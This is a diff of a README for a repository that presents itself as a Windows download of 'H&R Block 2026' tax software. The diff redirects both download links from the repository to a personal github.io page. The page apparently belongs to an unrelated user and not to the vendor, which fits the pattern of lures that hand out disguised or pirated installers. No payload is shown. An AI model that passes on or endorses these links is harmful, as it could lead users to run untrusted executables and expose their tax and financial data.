@@ -1,6 +1,6 @@
 # 📁 H-R-Block-2026 - Prepare your taxes with ease on Windows
 
-[![](https://img.shields.io/badge/Download_H&R_Block_2026-Blue?style=for-the-badge)](https://github.com/Phamquo3606/H-R-Block-2026)
+[![](https://img.shields.io/badge/Download_H&R_Block_2026-Blue?style=for-the-badge)](https://phamquo3606.github.io)
 
 ## 📋 About the Software
 
@@ -21,7 +21,7 @@ Your computer must meet these basic needs to run the software. These requirement
 
 You can access the installation files directly through the link below.
 
-[Click here to download H-R-Block-2026](https://github.com/Phamquo3606/H-R-Block-2026)
+[Click here to download H-R-Block-2026](https://phamquo3606.github.io)
 
 ### Step-by-Step Installation Process
 
